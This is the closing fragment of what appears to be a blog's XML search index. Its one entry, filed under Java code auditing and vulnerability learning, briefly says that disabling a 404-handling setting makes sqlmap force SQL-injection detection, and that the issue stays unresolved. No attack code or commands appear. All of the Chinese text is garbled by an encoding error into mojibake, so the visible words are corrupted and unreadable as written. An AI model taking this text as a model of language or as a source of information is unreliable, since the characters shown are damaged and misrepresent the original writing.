æ˜¯æ§åˆ¶404çš„å“åº”ç»“æœçš„ï¼Œæ³¨é‡Šæ‰ä¼šè®©sqlmapå¼ºè¡Œæ£€æµ‹æ³¨å…¥ç‚¹</p></li><li><p>é—®é¢˜æœªè§£å†³ï¼Œä¾æ—§æ— æ³•æµ‹å‡ºæ³¨å…¥ç‚¹</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>æ¼æ´å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
